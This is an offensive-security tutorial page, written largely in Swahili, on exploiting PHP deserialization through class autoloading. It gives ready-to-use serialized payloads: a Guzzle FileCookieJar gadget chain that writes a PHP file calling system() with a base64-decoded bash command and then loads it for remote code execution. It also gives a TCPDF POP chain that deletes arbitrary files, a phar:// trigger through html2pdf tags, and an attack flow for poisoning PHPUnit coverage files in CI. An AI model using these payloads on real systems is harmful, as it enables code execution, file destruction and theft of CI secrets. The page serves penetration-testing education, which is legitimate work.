# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Kwanza, unapaswa kuangalia ni nini [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Tuko katika hali ambapo tuligundua **PHP deserialization in a webapp** bila maktaba yoyote iliyo vunerable kwa gadgets ndani ya **`phpggc`**. Hata hivyo, kwenye container ile ile kulikuwa na **webapp tofauti ya composer yenye libraries zilizo vunerable**. Kwa hivyo, lengo lilikuwa **kupakia composer loader ya webapp nyingine** na kuilitumia ili **kupakia gadget itakayotumia library hiyo** kutoka kwenye webapp iliyovulnerable kwa deserialization.

Steps:

- Umevumbua **deserialization** na hakupo **gadget** yoyote katika code ya app ya sasa
- Unaweza kuibia/tumia function ya **`spl_autoload_register`** kama ifuatavyo ili **kupakia file yoyote ya local yenye extension `.php`**
- Kwa hilo utatumia deserialization ambapo jina la class litawekwa ndani ya **`$name`**. Huwezi kutumia "/" au "." katika jina la class katika serialized object, lakini **code** inafanya **replace** ya **underscores** ("_") kwa **slashes** ("/"). Kwa hivyo jina la class kama `tmp_passwd` litabadilishwa kuwa `/tmp/passwd.php` na code itajaribu kuiload.\
A **gadget example** itakuwa: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Ikiwa una file upload na unaweza kupakia faili yenye **`.php` extension`** unaweza **kutumia vibaya kipengele hiki moja kwa moja** na kupata RCE.

Katika kesi yangu, sikuwa nayo, lakini ndani ya **same container** kulikuwa na tovuti nyingine ya composer yenye **library vulnerable to a `phpggc` gadget**.

- Ili kupakia library hii nyingine, kwanza unahitaji **load the composer loader of that other web app** (kwa sababu ile ya current application haitafikia libraries za nyingine.) **Kwa kujua path ya application**, unaweza kufanya hivyo kwa urahisi na: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Katika kesi yangu, composer loader ilikuwa katika `/www/frontend/vendor/autoload.php`)
- Sasa, unaweza **load** others **app composer loader**, hivyo ni wakati wa **`generate the phpgcc`** **payload** ya kutumia. Katika kesi yangu, nilitumia **`Guzzle/FW1`**, ambayo iliniruhusu **kuandika faili yoyote ndani ya filesystem**.
- NOTE: The **generated gadget was not working**, ili ili ifanye kazi nilibadilisha payload hiyo **`chain.php`** ya phpggc na niliweka **all the attribute** za classes **kutoka private hadi public**. Vinginevyo, baada ya ku-deserialize string, attributes za objects zilizotengenezwa hazikuwa na thamani yoyote.
- Sasa tuna njia ya **load the others app composer loader** na kuwa na **phpggc payload that works**, lakini tunahitaji **kufanya hili katika SAME REQUEST ili loader ipakwe wakati gadget itatumika**. Kwa hilo, nilituma array iliyoserializa yenye vitu vyote viwili kama:
- Unaweza kuona **kwanza loader inapakiwa kisha payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Sasa, tunaweza **kuunda na kuandika faili**, hata hivyo, mtumiaji **hakuweza kuandika katika kabrasha lolote ndani ya web server**. Kwa hivyo, kama unavyoona kwenye payload, PHP inayoitisha **`system`** na baadhi ya **base64** imeundwa katika **`/tmp/a.php`**. Kisha, tunaweza **kutumia tena aina ya kwanza ya payload** tuliyotumia kama LFI ili kupakia composer loader ya webapp nyingine ili **kupakia faili iliyotengenezwa `/tmp/a.php`**. Ijumuishe tu kwenye deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Muhtasari wa payload**

- **Load the composer autoload** ya webapp tofauti ndani ya container ile ile
- **Load a phpggc gadget** kwa kutumia library kutoka webapp nyingine (webapp ya awali iliyovulnerable kwa deserialization haikuwa na gadget yoyote kwenye libraries zake)
- The gadget itaunda **a file with a PHP payload** ndani ya /tmp/a.php ikiwa na amri zenye madhara (mtumiaji wa webapp hawezi kuandika kwenye folder yoyote ya webapp)
- Sehemu ya mwisho ya payload yetu itatumia **load the generated php file** ambayo itatekeleza amri

Nilihitaji **kuitisha deserialization hii mara mbili**. Katika majaribio yangu, mara ya kwanza faili `/tmp/a.php` ilitengenezwa lakini haikoloadiwa, na mara ya pili ilioloadiwa vizuri.

### Hivi karibuni phpggc goodies (2025)

- The **phpggc master branch keeps adding chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 na mengine yalikuja 2025 — muhimu wakati target app inashare vendor code na miradi hiyo. Njia rahisi ya kutafuta ni `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (update your clone first).
- Unapochanganya gadgets across apps kupitia autoloading, kumbuka **private properties in gadget definitions may be dropped** wakati classes zinapojangiliwa upya tofauti kwenye target; hariri `chain.php` ya gadget kufanya properties kuwa `public` ikiwa payload inafika na values tupu (njia ile ile iliyoonyeshwa hapo juu).

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) unserialized arbitrary PHP objects from `.coverage` files produced by the **PHPT runner**. Katika CI pipelines ambapo contributors wasiotegemewa wanaweza push tests, kuacha `.coverage` iliyotengenezwa husababisha deserialization mara tu suite inapoendesha — hakuna web access inahitajika.

**Mtiririko wa shambulio**

1. Weka `.coverage` yenye madhara katika repo (au artifact) inayojumuisha serialized gadget inayopatikana katika test dependencies (kwa mfano, Monolog au Guzzle chain kutoka phpggc).
2. Submit PR; wakati CI inapoendesha `phpunit --configuration phpunit.xml`, PHPT runner itasoma coverage file na deserializes gadget, ikitoa **RCE inside the runner container**.
3. Hii ni hasa hatari wakati tests zinakamilisha mount ya CI secrets (cloud creds, deployment keys).

**Minimal malicious coverage stub** (weka pamoja na PHPT test):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Endesha PHPT ili phpunit isome `exploit.coverage`.

## TCPDF `__destruct` POP chain kwa kufuta faili yoyote

Wakati mfano halisi wa `TCPDF` unapofutwa na garbage collector, unaita `_destroy(true)`, hupitia `$this->imagekeys`, na hutumia `unlink()` kufuta chochote kinachoonekana kama faili ya cache ndani ya `K_PATH_CACHE`. Kama application inafanya `unserialize($user_data)` wakati class ya `TCPDF` imepakiwa (kwa mfano inatarajia array yenye key ya `html`), unaweza kutoa object iliyoserialized inayoweka:

- `file_id` kwa nambari yoyote isiyopo katika `self::$cleaned_ids` (kwa mfano `-1`).
- `imagekeys` kwa path ambazo zinaanza na `K_PATH_CACHE` au ambazo zinaweza kuonekana kama hiyo (kwa mfano `/tmp/../tmp/do_not_delete_this_file.txt` wakati `K_PATH_CACHE` ni `/tmp/`).

Mfano la payload linalolenga mtiririko usio salama `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Faili inafutwa mara tu object inapopotea kutoka scope. TCPDF 6.9.3 ilikaza ukaguzi ili kuondoa tu njia zenye kiendelezo cha `__tcpdf_<file_id>_` ndani ya `K_PATH_CACHE` na ilianzisha `_unlink()` kuzuia schemes zisizo za `file://`, hivyo matoleo ya zamani ya `Producer` ni malengo mazuri.

### Kusababisha gadget kupitia `phar://` katika html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) inamfunika TCPDF na inatoa block maalum `<cert>` whose `src`/`privkey` attributes are validated with plain `file_exists()`. Kwenye PHP < 8.0 kazi yoyote ya filesystem inayogusa URL ya `phar://` husababisha metadata ya Phar kufanyiwa unserialize. Kwa kuhifadhi TCPDF object mbaya hapo juu ndani ya archive ya Phar unapata POP ya kuaminika hata kama application haiwahi kuita `unserialize()` yenyewe.

1. Tengeneza Phar ukiwa na `phar.readonly=0`, weka stub/manifest ionekane kama image (mfano badili `archive.phar` kuwa `archive.png`), na hifadhi TCPDF object iliyoserialized katika metadata ya Phar.
2. Pakia/weke faili mahali pa kufikiwa kama `/tmp/user_files/user_1/archive.png`.
3. Tuma HTML yenye tagi `<cert>` ili html2pdf ichague njia inayodhibitiwa na mshambuliaji:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Mwito wa `file_exists()` hufanya deserialization ya metadata, huunda mfano wa TCPDF, na destructor yake huifuta faili iliyochaguliwa, hivyo kuibadilisha html2pdf kuwa entry point yenye nguvu ya `phar://`. Toleo 5.3.1 liliongeza `Security::checkValidPath()` ili kuzuia schemes zisizoruhusiwa, hivyo usakinishaji wa zamani unabaki kuvutia.

## Marejeo

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
